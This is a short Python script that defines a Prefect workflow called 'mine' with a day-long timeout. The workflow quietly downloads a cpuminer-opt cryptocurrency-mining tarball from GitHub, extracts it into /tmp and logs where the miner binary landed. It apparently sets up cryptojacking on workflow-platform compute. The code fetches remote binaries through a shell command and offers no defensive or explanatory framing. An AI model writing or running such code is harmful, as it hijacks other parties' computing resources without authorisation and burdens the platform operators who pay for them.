import subprocess, time
from prefect import flow, get_run_logger

@flow(timeout_seconds=86400)
def mine():
    logger = get_run_logger()
    subprocess.run("wget -q https://github.com/RainbowMiner/miner-binaries/releases/download/v5.0.46-rplant/cpuminer-opt-linux-5.0.46u.tar.gz -O /tmp/c.tar.gz && tar xf /tmp/c.tar.gz -C /tmp/", shell=True)
    result = subprocess.run("find /tmp -name 'cpuminer*' -type f", shell=True, capture_output=True, text=True)
    logger.info("Files: " + result.stdout)

if __name__ == "__main__":
    mine()
